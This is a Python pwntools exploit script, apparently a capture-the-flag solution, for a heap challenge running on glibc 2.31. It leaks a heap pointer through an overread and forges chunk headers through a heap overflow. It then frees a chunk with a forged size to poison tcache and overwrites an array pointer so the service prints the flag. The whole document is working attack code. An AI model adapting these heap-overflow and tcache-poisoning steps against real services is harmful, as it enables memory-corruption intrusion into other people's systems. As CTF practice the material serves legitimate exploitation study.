#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("./chall_patched", checksec=False)


def conn():
    if args.LOCAL:
        return process([exe.path])
    host = args.HOST or "localhost"
    port = int(args.PORT or 1337)
    use_ssl = args.SSL if args.SSL is not None else True
    return remote(host, port, ssl=use_ssl)


def sla(r, x, y):
    r.sendlineafter(x, y)


def sa(r, x, y):
    r.sendafter(x, y)


def cmd(r, op):
    sla(r, b"Operation (insert/delete/peek/edit/count/quit): ", op)


def insert(r, msg):
    cmd(r, b"insert")
    sla(r, b"Message: ", msg)


def delete(r):
    cmd(r, b"delete")
    line = r.recvline().rstrip(b"\n")
    if not line:
        line = r.recvline().rstrip(b"\n")
    return line


def peek(r):
    cmd(r, b"peek")
    line = r.recvline().rstrip(b"\n")
    if not line:
        line = r.recvline().rstrip(b"\n")
    return line


def edit(r, data):
    assert len(data) == 32
    cmd(r, b"edit")
    sa(r, b"Message: ", data)


def main():
    r = conn()

    # Layout (glibc 2.31): 7x0x30, then S8("b")=0x20, S9("a")=0x20, then A16(array)=0x90
    for i in range(7):
        insert(r, bytes([0x70 + i]) * 0x20)
    insert(r, b"b")
    insert(r, b"a")

    # Stage 1: overread from S9 into A16 and leak array[0] == S9 pointer
    edit(r, b"a" + b"B" * 31)
    leak = peek(r)
    s9_ptr = u64(leak[-6:] + b"\x00\x00")
    # From observed fixed heap geometry in this binary: flag at (S9 - 0x230)
    flag_ptr = s9_ptr - 0x230
    log.info("s9_ptr   = %#x", s9_ptr)
    log.info("flag_ptr = %#x", flag_ptr)

    # Stage 2: restore A16 header (next chunk after S9) and rotate root from S9 -> S8
    restore = b"c\x00".ljust(16, b"R") + p64(0x20) + p64(0x91)
    edit(r, restore)

    # Stage 3: from S8 overflow into S9 header, forge S9 size to 0x31 (tcache bin 0x30)
    forge = b"b\x00".ljust(16, b"F") + p64(0x1337) + p64(0x31)
    edit(r, forge)

    delete(r)  # frees S8
    delete(r)  # frees forged-size S9 into tcache[0x30]

    # Stage 4: allocate from forged 0x30 chunk; overwrite A16->array[0] with flag pointer
    target = p64(flag_ptr)[:6]
    payload = b"z" * 0x20 + target
    insert(r, payload)

    out = peek(r)
    log.success("flag line => %r", out)

    r.interactive()


if __name__ == "__main__":
    main()
